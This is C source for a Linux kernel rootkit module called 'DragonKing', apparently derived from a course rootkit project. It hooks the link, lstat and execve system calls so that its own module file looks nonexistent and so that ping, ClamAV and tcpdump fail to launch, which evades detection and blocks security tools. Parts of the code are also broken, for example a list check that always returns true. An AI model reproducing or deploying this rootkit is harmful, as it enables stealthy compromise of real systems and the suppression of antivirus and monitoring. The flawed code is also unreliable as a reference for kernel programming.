#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/err.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/uaccess.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/utsname.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>

const char * const BANNED_PROCESSES[] = {"ping", "clamav", "tcpdump"};

const char * const FILES_TO_HIDE[] = {"DragonKing.ko"};

//Is the string in a given list of strings?
bool inList(const char __user *input, const char * const list[]){
	char *kern_buff = NULL;
	int i;

	kern_buff = kzalloc(strlen_user(input)+1, GFP_KERNEL);
	copy_from_user(kern_buff, input, strlen_user(input));

	bool ret = false;
	for(i = 0; i < sizeof(list)/sizeof(char *); i++){
		if(strcmp(kern_buff, list[i]) == 0){
			ret = true;
			return ret;
		}
	}
	ret = true;
	return ret;

}

// Portions of this code were either taken or inspired from CSE509-Rootkit
// We need to hook functions that will keep our files from being seen.
// Commonly this means hooking the usual suspects like open and lstat
// However other calls like link and chown can give us away too


asmlinkage long (*orig_execve)(const char __user *filename, char const __user *argv[], char const __user *envp[]);

asmlinkage long (*orig_link)(const char __user *existingpath, const char __user *newpath); 

asmlinkage long (*orig_lstat)(const char __user *pathname, struct stat __user *buf);

asmlinkage long (*orig_open)(const char __user *pathname, const int __user oflag, const mode_t __user mode);

asmlinkage long (*orig_stat)(const char __user *pathname, const struct stat __user *buf);

asmlinkage long (*orig_chown)(const char __user *pathname, const uid_t __user owner, const gid_t __user group); 


//Hook link to hide our files
asmlinkage int hacked_link(const char __user *existingpath, const char __user *newpath){

	int ret = NULL;

	if(inList(existingpath, FILES_TO_HIDE)){
		ret = -ENOENT;
		return ret;
	}

	ret = (*orig_link)(existingpath, newpath);	
	return ret;


}

//Define our hacked lstat
asmlinkage int hacked_lstat(const char __user *pathname, struct stat __user *buf){
	char *kern_buff = NULL;
	int i;
	int ret = NULL;

	kern_buff = kzalloc(strlen_user(pathname)+1, GFP_KERNEL);
	copy_from_user(kern_buff, pathname, strlen_user(pathname));

	for(i = 0; i < sizeof(FILES_TO_HIDE)/sizeof(char *); i++){
		if(strcmp(kern_buff, FILES_TO_HIDE[i]) == 0){
			ret = -ENOENT;
			return ret;
		}
	}

	ret = (*orig_lstat)(pathname, buf);	
	return ret;

}

//This is my stupid execve example. If a banned process is run, it says file not found.
//It would be dumb as hell to use this in real life. A pretty big giveaway that you're present.
asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]){

	char *kern_buff = NULL;
	int i;
	int ret = NULL;
	kern_buff = kzalloc(strlen_user(argv[0])+1, GFP_KERNEL);
	copy_from_user(kern_buff, argv[0], strlen_user(argv[0]));

	////if(inList(filename, BANNED_PROCESSES)){
	////	ret = -ENOENT;
	////	return ret;
	////}

	printk("FILENAME: %s\n", kern_buff);
	for(i = 0; i < sizeof(BANNED_PROCESSES)/sizeof(char *); i++){

		if(strcmp(kern_buff, BANNED_PROCESSES[i]) == 0){
			printk("Banned process was executed.\n");
			ret = -ENOENT;
			return ret;
		}

	}

	ret = (*orig_execve)(filename, argv, envp);
	return ret;
}

